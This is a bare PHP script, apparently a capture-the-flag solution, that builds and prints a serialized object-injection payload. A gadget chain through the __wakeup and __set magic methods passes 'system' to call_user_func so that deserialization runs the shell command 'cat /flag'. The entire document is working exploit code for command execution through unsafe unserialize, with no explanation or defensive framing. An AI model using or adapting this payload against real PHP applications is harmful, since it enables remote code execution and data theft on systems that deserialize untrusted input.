<?php
class A{
    var $a;
    var $c;
    public function __wakeup()
    {
        $this->a->c=$this->c;
    }
}
class B{
    var  $b;
    public function __set($k,$v){
        call_user_func($this->b,$v);
    }
}

$a=new A();

$b=new B();

$a->a=$b;
$a->c="cat /flag";
$b->b="system";
echo serialize($a);


